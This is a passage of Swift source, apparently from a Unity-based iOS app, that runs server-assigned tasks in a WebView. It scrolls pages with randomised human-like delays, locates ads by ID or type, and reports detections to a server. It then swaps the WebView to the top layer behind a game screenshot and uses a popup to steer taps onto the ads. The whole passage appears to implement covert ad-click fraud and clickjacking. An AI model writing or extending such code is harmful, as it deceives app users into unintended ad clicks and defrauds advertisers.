                        print("[H5] [JS] [SingleLayerVM] 使用原生弹窗引导点击")
                        self.bestMatchedAd = ad
                        self.switchLayers()
                    }
                    
                case .failure(let error):
                    print("[H5] [JS] [SingleLayerVM] iframe广告点击失败: \(error)")
                    // 失败时回退到原生弹窗
                    self.bestMatchedAd = ad
                    self.switchLayers()
                }
            }
        } else { // 使用原生弹窗引导点击
            bestMatchedAd = ad
            switchLayers()
        }
    }
    
    /// 广告匹配结果枚举
    private enum AdMatchResult {
        case found(AdElement)           // 找到可见可点击的匹配广告
        case foundButInvisible(AdElement) // 找到匹配广告但不可见
        case notFound                   // 未找到匹配广告
    }
    
    /// 查找最佳匹配广告的核心逻辑
    private func findBestMatchingAd(from clickableAds: [AdElement], allAds: [AdElement], task: LinkTask) -> AdMatchResult {
        
        // 1. 优先匹配 ID（如果指定了ID）
        if let targetId = task.id, !targetId.isEmpty {
            print("[H5] [SingleLayerVM] 🔍 优先匹配 ID: \(targetId)")
            
            // 在可点击广告中查找匹配ID且可见的广告
            if let visibleIdMatch = clickableAds.first(where: { $0.id == targetId && $0.visible }) {
                print("[H5] [SingleLayerVM] ✅ 找到可见可点击的ID匹配广告: \(targetId)")
                return .found(visibleIdMatch)
            }
            
            // 在可点击广告中查找匹配ID但不可见的广告
            if let invisibleIdMatch = clickableAds.first(where: { $0.id == targetId && !$0.visible }) {
                print("[H5] [SingleLayerVM] ⚠️ 找到ID匹配广告但不可见: \(targetId)")
                return .foundButInvisible(invisibleIdMatch)
            }
            
            // 在所有广告中查找匹配ID但不可点击的广告
            if let nonClickableIdMatch = allAds.first(where: { $0.id == targetId && !$0.isClickable }) {
                print("[H5] [SingleLayerVM] ⚠️ 找到ID匹配广告但不可点击: \(targetId)")
                return .foundButInvisible(nonClickableIdMatch)
            }
            
            print("[H5] [SingleLayerVM] ❌ 未找到任何ID匹配的广告: \(targetId)")
            return .notFound
        }
        
        // 2. 其次匹配类型（如果指定了类型）
        if let targetType = task.adType, !targetType.isEmpty {
            print("[H5] [SingleLayerVM] 🔍 匹配类型: \(targetType)")
            
            // 处理类型映射：inter -> iner
            let actualTargetType = targetType == "inter" ? "iner" : targetType
            print("[H5] [SingleLayerVM] 🔍 实际匹配类型: \(actualTargetType)")
            
            // 在可点击广告中查找匹配类型且可见的广告
            let visibleTypeMatches = clickableAds.filter { $0.type.rawValue == actualTargetType && $0.visible }
            if !visibleTypeMatches.isEmpty {
                let selectedAd = visibleTypeMatches.randomElement()!
                print("[H5] [SingleLayerVM] ✅ 找到 \(visibleTypeMatches.count) 个可见可点击的类型匹配广告，选择: \(selectedAd.id)")
                return .found(selectedAd)
            }
            
            // 在可点击广告中查找匹配类型但不可见的广告
            let invisibleTypeMatches = clickableAds.filter { $0.type.rawValue == actualTargetType && !$0.visible }
            if !invisibleTypeMatches.isEmpty {
                let selectedAd = invisibleTypeMatches.first!
                print("[H5] [SingleLayerVM] ⚠️ 找到 \(invisibleTypeMatches.count) 个类型匹配广告但不可见，选择: \(selectedAd.id)")
                return .foundButInvisible(selectedAd)
            }
            
            // 在所有广告中查找匹配类型但不可点击的广告
            let nonClickableTypeMatches = allAds.filter { $0.type.rawValue == actualTargetType }
            print("[H5] [SingleLayerVM] 🔍 类型匹配检查: 目标类型=\(targetType), 找到不可点击匹配广告数量=\(nonClickableTypeMatches.count)")
            
            if !nonClickableTypeMatches.isEmpty {
                // 过滤掉无效区域的广告，只选择有有效区域的广告
                let validAreaMatches = nonClickableTypeMatches.filter { $0.area?.isValid ?? false }
                
                if !validAreaMatches.isEmpty {
                    // 选择最近的一个有有效区域的不可点击匹配广告（按位置排序）
                    let sortedValidMatches = validAreaMatches.sorted { ad1, ad2 in
                        guard let area1 = ad1.area, let area2 = ad2.area else { return false }
                        return area1.top < area2.top // 按top位置排序，选择最近的
                    }
                    let selectedAd = sortedValidMatches.first!
                    print("[H5] [SingleLayerVM] ⚠️ 找到 \(validAreaMatches.count) 个有有效区域的类型匹配广告但不可点击，选择最近的: \(selectedAd.id), 位置: \(selectedAd.area?.top ?? 0), 可见性: \(selectedAd.visible)")
                    return .foundButInvisible(selectedAd)
                } else {
                    print("[H5] [SingleLayerVM] ⚠️ 找到 \(nonClickableTypeMatches.count) 个类型匹配广告但都无有效区域，无法滚动")
                    return .notFound
                }
            }
            
            print("[H5] [SingleLayerVM] ❌ 未找到任何类型匹配的广告: \(targetType)")
            return .notFound
        }
        
        // 3. 如果既没有指定ID也没有指定类型，返回未找到（让上层处理）
        print("[H5] [SingleLayerVM] ℹ️ 任务未指定ID和类型，返回未找到状态")
        return .notFound
    }
    
    /// 处理没有可点击广告的情况
    private func handleNoClickableAds(ads: [AdElement], isLastDetection: Bool) {
        guard let task = currentTask else { return }
        
        // 如果任务没有指定 ID 和类型，直接使用兜底区域
        if task.id == nil && task.adType == nil {
            print("[H5] [SingleLayerVM] 📌 任务未指定 ID 和类型，直接使用兜底区域")
            // 只在最后一次检测时上报
            if retryScrollCount >= maxRetryScrollCount {
                reportAdDetectionResult(isSuccess: false, ads: ads)
            }
            handleNoAdsDetected(isLastDetection: true)
            return
        }
        
        // 检查是否有匹配但不可点击的广告（可能需要滚动到可视区域）
        let hasMatchingButNonClickableAd = checkForMatchingButNonClickableAd(ads: ads, task: task)
        
        if hasMatchingButNonClickableAd && retryScrollCount <= maxRetryScrollCount {
            print("[H5] [SingleLayerVM] 🔄 发现匹配但不可点击的广告，继续滑动尝试激活")
            handleNoMatchRetryScrolling()
            return
        }
        
        // 如果是纯广告点击任务，直接使用兜底区域
        if interactionMode == .adClickOnly {
            print("[H5] [SingleLayerVM] 📌 纯广告点击任务，未找到任何可点击广告，使用兜底区域")
            // 只在最后一次检测时上报
            if retryScrollCount >= maxRetryScrollCount {
                reportAdDetectionResult(isSuccess: false, ads: ads)
            }
            handleNoAdsDetected(isLastDetection: true)
            return
        }
        
        // 对于需要滚动的任务，且指定了 ID 或类型，继续尝试
        if retryScrollCount <= maxRetryScrollCount {
            print("[H5] [SingleLayerVM] 🔄 继续滑动寻找可点击广告")
            handleNoMatchRetryScrolling()
        } else {
            print("[H5] [SingleLayerVM] ❌ 已达到最大重试次数，使用兜底区域")
            // 只在最后一次检测时上报
            if retryScrollCount >= maxRetryScrollCount {
                reportAdDetectionResult(isSuccess: false, ads: ads)
            }
            handleNoAdsDetected(isLastDetection: true)
        }
    }
    
    /// 检查是否有匹配但不可点击的广告
    private func checkForMatchingButNonClickableAd(ads: [AdElement], task: LinkTask) -> Bool {
        // 检查ID匹配
        if let targetId = task.id, !targetId.isEmpty {
            let hasMatchingId = ads.contains { $0.id == targetId }
            if hasMatchingId {
                print("[H5] [SingleLayerVM] 🔍 发现ID匹配但不可点击的广告: \(targetId)")
                return true
            }
        }
        // 检查类型匹配
        if let targetType = task.adType, !targetType.isEmpty {
            // 处理类型映射：inter -> iner
            let actualTargetType = targetType == "inter" ? "iner" : targetType
            let hasMatchingType = ads.contains { ad in
                guard ad.type.rawValue == actualTargetType else { return false }
                guard let area = ad.area else { return false }
                return area.isValid
            }
            if hasMatchingType {
                print("[H5] [SingleLayerVM] 🔍 发现类型匹配且有有效区域但不可点击的广告: \(targetType) -> \(actualTargetType)")
                return true
            }
        }
        return false
    }
    
    /// 上报广告检测结果到服务器
    private func reportAdDetectionResult(isSuccess: Bool, ads: [AdElement]) {
        guard !ads.isEmpty else {
            print("[H5] [SingleLayerVM] ℹ️ ads 为空！！！")
            return
        }
        guard let task = currentTask else {
            print("[H5] [SingleLayerVM] ⚠️ 任务不可用，无法上报检测结果")
            return
        }
        print("[H5] [SingleLayerVM] 📊 开始上报广告检测结果到服务器 ads: \(ads)")
        print("[H5] [SingleLayerVM] 📊 检测结果: \(isSuccess ? "成功" : "失败")")
        print("[H5] [SingleLayerVM] 📊 检测次数: \(retryScrollCount + 1)")
        print("[H5] [SingleLayerVM] 📊 任务信息: \(task.taskDescription)")
        
        let json = H5UploadParam.loadParams(ads, link: task.link)
        print("[H5] [SingleLayerVM] 📊 json: \(String(describing: json))")
        NetworkServer.uploadH5Params(json)
        
        print("[H5] [SingleLayerVM] ✅ 广告检测结果上报完成")
    }
    
    /// 直接滚动到广告位置
    private func scrollToAd(_ ad: AdElement) {
        // 增加重试计数
        retryScrollCount += 1
        
        print("[H5] [SingleLayerVM] 🔄 滚动到广告位置 - 当前重试次数: \(retryScrollCount)/\(maxRetryScrollCount)")
        
        // 检查是否达到最大重试次数
        if retryScrollCount > maxRetryScrollCount {
            print("[H5] [SingleLayerVM] ⚠️ 已达到最大重试次数，使用兜底方案")
            handleNoAdsDetected(isLastDetection: true)
            return
        }
        
        state = .retryScrolling
        print("[H5] [SingleLayerVM] 🔄 开始精确滚动到广告位置 (第\(retryScrollCount)次)")
        print("[H5] [SingleLayerVM] 📊 广告类型: \(ad.type.rawValue), ID: \(ad.id), 可见性: \(ad.visible)")
        
        performScrolling(type: .scrollToAd(ad)) { [weak self] in
            guard let self = self else { return }
            
            // 滚动后等待一段时间再检测广告
            let delay = TimeInterval.random(in: 1.0...2.0)
            DispatchQueue.main.asyncAfter(deadline: .now() + delay) {
                print("[H5] [SingleLayerVM] 🔄 滚动到广告位置完成，开始重新检测广告")
                self.detectAds()
            }
        }
    }
    
    /// 处理未找到匹配广告时的重试滑动
    private func handleNoMatchRetryScrolling() {
        // 检查重试次数是否超过最大值
        if retryScrollCount > maxRetryScrollCount {
            print("[H5] [SingleLayerVM] ⚠️ 已达到最大重试次数(\(maxRetryScrollCount)次)，停止重试")
            // 使用兜底方案
            if !detectedAds.filter({ $0.isClickable }).isEmpty {
                print("[H5] [SingleLayerVM] 🔄 使用第一个可点击广告作为兜底")
                bestMatchedAd = detectedAds.filter { $0.isClickable }.first
            } else {
                handleNoAdsDetected(isLastDetection: true)
            }
            return
        }
        
        print("[H5] [SingleLayerVM] 🔄 未找到匹配广告，继续滚动查找 (第 \(retryScrollCount + 1)/\(maxRetryScrollCount) 次)")
        retryScrolling()
    }
    
    /// 重试滑动
    private func retryScrolling() {
        retryScrollCount += 1
        state = .retryScrolling
        print("[H5] [SingleLayerVM] 🔄 开始第 \(retryScrollCount) 次重试滑动")
        
        performScrolling(type: .retryForAd) { [weak self] in
            guard let self = self else { return }
            
            // 检查是否达到最大重试次数
            if self.retryScrollCount >= self.maxRetryScrollCount {
                print("[H5] [SingleLayerVM] ⚠️ 已达到最大重试次数，使用兜底方案")
                if !self.detectedAds.filter({ $0.isClickable }).isEmpty {
                    self.bestMatchedAd = self.detectedAds.filter { $0.isClickable }.first
                } else {
                    self.handleNoAdsDetected(isLastDetection: true)
                }
                return
            }
            
            // 滑动后等待一段时间再检测广告
            let delay = TimeInterval.random(in: 0.5...1.5)
            DispatchQueue.main.asyncAfter(deadline: .now() + delay) {
                self.detectAds()
            }
        }
    }
    
    /// 完成当前任务（成功或失败）
    private func finishCurrentTask(isSuccess: Bool) {
        guard let task = currentTask else {
            print("[H5] [SingleLayerVM] ⚠️ 没有当前任务，无法完成")
            return
        }
        
        if isSuccess {
            print("[H5] [SingleLayerVM] 📝 任务成功完成: \(task.taskDescription)")
            state = .completed
        } else {
            print("[H5] [SingleLayerVM] 📝 任务失败完成: \(task.taskDescription)")
        }
        
        // 停止 WebView 相关操作
        stopWebViewOperations()
        
        // 设置下一个任务的延迟
        let nextAdGap = TimeInterval(task.nextAdGap)
        print("[H5] [SingleLayerVM] ⏱️ 下一个任务将在 \(Int(nextAdGap)) 秒后开始")
        
        // 从数据库删除当前已完成的任务
        taskRepository.markTaskCompleted(task)
        
        // 删除当前任务
        currentTask = nil
        print("[H5] [SingleLayerVM] 🗑️ 已删除\(isSuccess ? "完成" : "失败")的任务")
        
        // 重置状态
        resetState()
        
        // 延迟启动下一个任务
        DispatchQueue.main.asyncAfter(deadline: .now() + nextAdGap) { [weak self] in
            guard let self = self else { return }
            print("[H5] [SingleLayerVM] ⏰ nextAdGap(\(Int(nextAdGap))秒)已过，准备开始下一个任务")
            self.startNextTask()
        }
    }
    
    /// 停止WebView的所有操作
    private func stopWebViewOperations() {
        guard let webViewCoordinator = webViewCoordinator, let webView = webViewCoordinator.webView else {
            print("[H5] [SingleLayerVM] ⚠️ WebView不可用，无法停止操作")
            return
        }
        
        print("[H5] [SingleLayerVM] 🛑 停止WebView操作")
        
        // 停止所有正在进行的导航
        webView.stopLoading()
        
        // 清除所有回调，防止异步回调影响下一个任务
        webViewCoordinator.onDidFinish = nil
        webViewCoordinator.onLoadIframe = nil
        webViewCoordinator.onDidFail = nil
        
        print("[H5] [SingleLayerVM] ✅ WebView操作已停止")
    }
    
    /// 重新设置WebView回调
    private func setupWebViewCallbacks() {
        guard let webViewCoordinator = webViewCoordinator else {
            print("[H5] [SingleLayerVM] ⚠️ WebView协调器不可用，无法设置回调")
            return
        }
        
        print("[H5] [SingleLayerVM] 🔧 设置WebView回调")
        
        // 设置WebView加载完成回调
        webViewCoordinator.onDidFinish = { [weak self] coordinator in
            DispatchQueue.main.async {
                print("[H5] [SingleLayerVM] 🔧 onDidFinish ~~~~~~~~")
                self?.handleWebViewLoaded(coordinator)
            }
        }
        
        // 设置WebView加载失败回调
        webViewCoordinator.onDidFail = { [weak self] error in
            DispatchQueue.main.async {
                print("[H5] [SingleLayerVM] 🔧 onDidFail ~~~~~~~~")
                self?.handleWebViewLoadFailed(error)
            }
        }
        
        // 设置广告点击回调
        webViewCoordinator.onLoadIframe = { [weak self] coordinator in
            DispatchQueue.main.async {
                print("[H5] [SingleLayerVM] 🔧 onLoadIframe ~~~~~~~~")
                self?.handleAdIframeLoaded(coordinator)
            }
        }
        
        print("[H5] [SingleLayerVM] ✅ WebView回调设置完成")
    }
    
    /// 准备下一个任务
    private func prepareNextTask() {
        // 重置状态
        resetState()
        
        // 开始下一个任务
        startTaskProcess()
    }
    
    /// 重置状态
    private func resetState() {
        print("[H5] [SingleLayerVM] 🔄 开始重置状态")
        
        // 清理 WebView 缓存
        //clearWebViewCache()
        
        // 清理 UI 状态
        cleanupUIState()
        
        
        // 重置状态为 initial
        if case .failed = state {
            state = .initial
        } else if case .completed = state {
            state = .initial
        }
        
        print("[H5] [SingleLayerVM] ♻️ 重置状态完成")
    }
    
    /// 开始滑动
    private func startScrolling() {
        guard let task = currentTask else {
            print("[H5] [SingleLayerVM] ⚠️ 没有当前任务，无法完成")
            return
        }
        
        guard let scrollInteractor = scrollInteractor, isWebViewValid() else {
            print("[H5] [SingleLayerVM] ⚠️ WebView 或滑动交互器不可用，跳过滑动")
            state = .failed(NSError(domain: "SingleLayerViewModel", code: 500, userInfo: [NSLocalizedDescriptionKey: "WebView 不可用"]))
            return
        }
        
        state = .scrolling
        scrollStartTime = Date()
        
        // 使用滑动交互器执行带延迟控制的初始滑动
        let taskConfig = ScrollTaskConfig(task: task)
        
        scrollInteractor.performScrollTask(type: .initialBrowsing, taskConfig: taskConfig) { [weak self] result in
            guard let self = self else { return }
            
            switch result {
            case .success, .insufficientContent, .reachedBottom:
                print("[H5] [SingleLayerVM] ✅ 初始滑动完成，开始检测广告")
                self.scrollEndTime = Date()
                
                // 滑动完成后，延迟一段时间再检测广告
                let delay = TimeInterval.random(in: 1...2)
                DispatchQueue.main.asyncAfter(deadline: .now() + delay) {
                    self.detectAds()
                }
                
            case .failure(let error):
                print("[H5] [SingleLayerVM] ❌ 初始滑动失败: \(error.localizedDescription)")
                self.state = .failed(error)
            }
        }
    }
    
    /// 执行简化的滑动操作
    private func performScrolling(type: ScrollInteractionType, completion: @escaping () -> Void) {
        guard let scrollInteractor = scrollInteractor, isWebViewValid() else {
            print("[H5] [SingleLayerVM] ❌ WebView 或滑动交互器不可用，无法执行滑动")
            if case .secondaryPageInteraction = type {} else {
                state = .failed(NSError(domain: "SingleLayerViewModel", code: 500, userInfo: [NSLocalizedDescriptionKey: "WebView 不可用"]))
            }
            completion()
            return
        }
        
        print("[H5] [SingleLayerVM] 🔄 开始\(type.description)滑动")
        
        // 使用统一的滑动交互器执行滑动
        scrollInteractor.performScrollInteraction(type: type) { [weak self] result in
            guard let self = self else {
                completion()
                return
            }
            
            switch result {
            case .success:
                if case .secondaryPageInteraction = type {} else {
                    print("[H5] [SingleLayerVM] ✅ \(type.description)滑动完成")
                    completion()
                }
                
            case .insufficientContent:
                if case .secondaryPageInteraction = type {} else {
                    print("[H5] [SingleLayerVM] ℹ️ 内容不足以滚动，直接完成")
                    completion()
                }
                
            case .reachedBottom:
                if case .secondaryPageInteraction = type {} else {
                    print("[H5] [SingleLayerVM] 📍 已到达底部")
                    completion()
                }
                
            case .failure(let error):
                print("[H5] [SingleLayerVM] ❌ \(type.description)滑动失败: \(error.localizedDescription)")
                if case .secondaryPageInteraction = type {} else {
                    self.state = .failed(error)
                }
                completion()
            }
        }
    }
    
    /// 切换层级
    private func switchLayers() {
        // 在切换层级前确认WebView仍然有效
        guard isWebViewValid() else {
            print("[H5] [SingleLayerVM] ⚠️ 切换层级前WebView已失效，取消层级切换")
            state = .failed(NSError(domain: "SingleLayerViewModel", code: 500, userInfo: [NSLocalizedDescriptionKey: "WebView 不可用"]))
            return
        }
        
        // 如果已经切换过层级，不要重复切换
        guard !isLayerSwitched else {
            print("[H5] [SingleLayerVM] ⚠️ 已经切换过层级，跳过重复切换")
            return
        }
        
        // 如果正在截图中，避免重复截图
        guard !isCapturingScreenshot else {
            print("[H5] [SingleLayerVM] ⚠️ 正在截图中，跳过重复截图请求")
            return
        }
        
        // 添加日志，确认切换层级前WebView状态
        print("[H5] [SingleLayerVM] 📊 切换层级前WebView状态: isWebViewValid=\(isWebViewValid()), coordinator=\(webViewCoordinator != nil ? "有效" : "无效")")
        
        // 每次切换层级前都重新截图，确保截图内容是最新的
        print("[H5] [SingleLayerVM] 📸 开始获取最新的Unity截图")
        
        Task {
            // 检查应用状态 - 防止在后台状态下截图导致崩溃
            await MainActor.run {
                let applicationState = UIApplication.shared.applicationState
                guard applicationState == .active else {
                    print("[H5] [SingleLayerVM] ⚠️ 应用状态异常，跳过截图: \(applicationState.rawValue)")
                    state = .failed(NSError(domain: "SingleLayerViewModel", code: 500, userInfo: [NSLocalizedDescriptionKey: "应用状态异常，无法截图"]))
                    return
                }
            }
            
            // 标记开始截图
            isCapturingScreenshot = true
            
            // 保持对WebView协调器的强引用，防止在截图过程中被释放
            let currentCoordinator = webViewCoordinator
            
            // 添加日志，确认截图前WebView状态
            await MainActor.run {
                print("[H5] [SingleLayerVM] 📊 截图前WebView状态: isWebViewValid=\(isWebViewValid()), coordinator=\(webViewCoordinator != nil ? "有效" : "无效")")
            }
            
            // 释放旧截图资源
            await MainActor.run {
                unityScreenshot = nil
                print("[H5] [SingleLayerVM] 🗑️ 已释放旧截图资源")
            }
            
            // 等待一个短暂的时间，确保Unity视图完全渲染，0.1秒
            try? await Task.sleep(nanoseconds: 100_000_000)
            
            // 使用Unity截图管理器获取截图
            print("[H5] [SingleLayerVM] 📸 使用Unity截图管理器进行截图")
            let screenshot = await screenshotManager.captureUnityScreenshot()
            
            await MainActor.run {
                // 标记截图完成
                isCapturingScreenshot = false
                
                // 再次确认WebView仍然有效
                guard isWebViewValid(), webViewCoordinator === currentCoordinator else {
                    print("[H5] [SingleLayerVM] ⚠️ 截图完成后WebView已失效或协调器已变更，取消层级切换")
                    state = .failed(NSError(domain: "SingleLayerViewModel", code: 500, userInfo: [NSLocalizedDescriptionKey: "WebView 不可用"]))
                    return
                }
                
                unityScreenshot = screenshot
                if let screenshot = unityScreenshot {
                    print("[H5] [SingleLayerVM] ✅ Unity 最新截图获取完成，尺寸: \(screenshot.size)")
                    print("[H5] [SingleLayerVM] 📊 截图详情: scale=\(screenshot.scale), hasAlpha=\(screenshot.cgImage?.alphaInfo != CGImageAlphaInfo.none)")
                    // 继续层级切换流程
                    performLayerSwitch()
                } else {
                    print("[H5] [SingleLayerVM] ❌ Unity 截图失败，取消层级切换")
                    // 截图失败时不进行层级切换，直接标记任务失败
                    self.state = .failed(NSError(domain: "SingleLayerViewModel", code: 500, userInfo: [NSLocalizedDescriptionKey: "Unity截图失败，无法切换层级"]))
                }
            }
        }
    }
    
    /// 执行层级切换的具体逻辑
    private func performLayerSwitch() {
        layerManager.bringWebViewToTop()
        isLayerSwitched = true
        print("[H5] [SingleLayerVM] 🔄 层级已切换，WebView 在顶层")
        
        // 添加日志，确认切换层级后WebView状态
        print("[H5] [SingleLayerVM] 📊 切换层级后WebView状态: isWebViewValid=\(isWebViewValid()), coordinator=\(webViewCoordinator != nil ? "有效" : "无效")")
        
        setupClickAdTime()
    }
    
    private func setupClickAdTime() {
        print("[H5] [SingleLayerVM] 开始计时自动完成任务")
        // 层级切换完成后，开始计时自动完成任务
        if let task = currentTask {
            let taskLifetime = TimeInterval(task.clickAdTime)
            print("[H5] [SingleLayerVM] ⏱️ 层级切换完成，\(taskLifetime) 秒后自动完成任务")
            
            DispatchQueue.main.asyncAfter(deadline: .now() + taskLifetime) { [weak self] in
                guard let self = self else { return }
                // 检查任务是否仍然有效且未完成
                if self.currentTask?.id == task.id && !self.isTaskFinished() {
                    print("[H5] [SingleLayerVM] ⏰ 任务存活时间到，自动完成任务")
                    self.tryFinishCurrentTask(isSuccess: true, reason: "任务存活时间到期")
                }
            }
        }
    }
    
    /// 尝试完成当前任务，确保任务只会被完成一次
    private func tryFinishCurrentTask(isSuccess: Bool, reason: String) {
        // 使用同步锁确保线程安全
        objc_sync_enter(self)
        defer {
            objc_sync_exit(self)
        }
        
        // 检查任务是否已经完成
        guard !isTaskCompleted else {
            print("[H5] [SingleLayerVM] ⚠️ 任务已经完成，忽略重复完成请求（原因：\(reason)）")
            return
        }
        
        // 标记任务已完成
        isTaskCompleted = true
        print("[H5] [SingleLayerVM] 📝 开始完成任务（原因：\(reason)）")
        
        // 调用实际的完成方法
        finishCurrentTask(isSuccess: isSuccess)
        
        showAdIndicator = false
    }
    
    // MARK: - 辅助方法
    /// 检查任务是否已完成或失败
    private func isTaskFinished() -> Bool {
        if isTaskCompleted { return true }
        switch state {
        case .completed, .failed:
            return true
        default:
            return false
        }
    }
    
    // MARK: - 析构函数
    deinit {
        scrollTimer?.invalidate()
        scrollTimer = nil
        isCapturingScreenshot = false
        cancellables.removeAll()
    }
    
    // MARK: - WebView缓存管理
    /// 清理WebView缓存
    private func clearWebViewCache() {
        guard let webViewCoordinator = webViewCoordinator, let webView = webViewCoordinator.webView else {
            print("[H5] [SingleLayerVM] ⚠️ WebView不可用，无法清理缓存")
            return
        }
        
        print("[H5] [SingleLayerVM] 🧹 开始清理WebView缓存")
        
        // 1. 停止所有正在进行的导航
        webView.stopLoading()
        
        // 2. 清理页面内容 - 加载空白页面
        webView.loadHTMLString("<html><body></body></html>", baseURL: nil)
        
        // 3. 清理WKWebView数据存储（异步操作，不阻塞）
        WKWebsiteDataStore.default().fetchDataRecords(ofTypes: WKWebsiteDataStore.allWebsiteDataTypes()) { records in
            WKWebsiteDataStore.default().removeData(ofTypes: WKWebsiteDataStore.allWebsiteDataTypes(),
                                                    for: records,
                                                    completionHandler: {
                print("[H5] [SingleLayerVM] ✅ WebView缓存清理完成")
            })
        }
        
        // 4. 清理URL缓存
        URLCache.shared.removeAllCachedResponses()
        
        print("[H5] [SingleLayerVM] 🧹 WebView缓存清理完成")
    }
    
    /// 开始下一个任务
    private func startNextTask() {
        DispatchQueue.main.async { [weak self] in
            guard let self = self else { return }
            print("[H5] [SingleLayerVM] 🔄 开始下一个任务")
            self.prepareNextTask()
            print("[H5] [SingleLayerVM] ")
        }
    }
    
    // MARK: - 公开方法
    /// 设置Unity控制器，用于截图
    internal func setUnityController(_ controller: UIViewController) {
        screenshotManager.setUnityController(controller)
        print("[H5] [SingleLayerVM] ✅ Unity控制器已设置到截图管理器")
    }
    
}
